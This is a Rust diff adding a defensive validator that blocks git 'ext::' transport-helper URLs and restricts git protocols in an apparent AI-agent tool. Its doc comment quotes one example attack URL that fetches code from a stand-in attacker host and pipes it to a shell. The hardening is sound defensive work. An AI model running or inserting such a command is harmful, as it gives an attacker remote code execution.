@@ -75,6 +75,49 @@ pub fn reject_option_like(value: &str, label: &str) -> Result<()> {
     ragent_types::guard::reject_option_like(value, label).map_err(anyhow::Error::msg)
 }
 
+/// SEC-012: reject a git remote URL that names a transport helper.
+///
+/// `git` treats a URL of the form `<scheme>::<command>` (for example
+/// `ext::sh -c 'curl http://attacker/x|sh'`) as a request to run `command`
+/// through the shell via a remote helper, so an LLM/user-supplied clone URL is a
+/// direct command-execution primitive. Only real network URLs are accepted here:
+/// an explicit `https://`, `http://`, `ssh://`, `git://`, a scp-style
+/// `git@host:path` / `user@host:path`, or a local filesystem path that does not
+/// contain `::`.
+///
+/// # Errors
+///
+/// Returns an error for an empty URL, a `::` transport helper, or any other
+/// scheme (`file://` and bare helper names included).
+pub fn validate_git_remote_url(url: &str) -> Result<()> {
+    let trimmed = url.trim();
+    if trimmed.is_empty() {
+        bail!("repository url must not be empty");
+    }
+    // A `::` names a remote helper (`ext::`, `transport::`); never legitimate.
+    if trimmed.contains("::") {
+        bail!("repository url '{trimmed}' uses a git transport helper and is refused");
+    }
+    // scp-style ssh (`git@github.com:owner/repo`) is fine.
+    if !trimmed.contains("://") {
+        if trimmed.contains('@') && trimmed.contains(':') {
+            return Ok(());
+        }
+        // A bare local path is acceptable (a directory to clone).
+        return Ok(());
+    }
+    let scheme = trimmed
+        .split_once("://")
+        .map(|(s, _)| s.to_ascii_lowercase())
+        .unwrap_or_default();
+    match scheme.as_str() {
+        "https" | "http" | "ssh" | "git" => Ok(()),
+        other => bail!(
+            "repository url scheme '{other}' is not permitted (allowed: https, http, ssh, git)"
+        ),
+    }
+}
+
 /// SEC-ragent-tools-vcs-003 (SECTASKS T-022): confine a `git clone`
 /// destination directory to the working directory.
 ///
@@ -120,6 +163,11 @@ pub fn run_git_output(args: &[&str], cwd: &std::path::Path) -> Result<GitOutput>
         .current_dir(cwd)
         .env("GIT_TERMINAL_PROMPT", "0")
         .env("GIT_ASKPASS", "false")
+        // SEC-012: restrict the protocols git may use (no external helpers) and
+        // refuse a protocol named only by environment/user config, so a
+        // repository URL cannot select an `ext::` helper.
+        .env("GIT_ALLOW_PROTOCOL", "https:http:git:ssh:file")
+        .env("GIT_PROTOCOL_FROM_USER", "0")
         .stdin(Stdio::null())
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
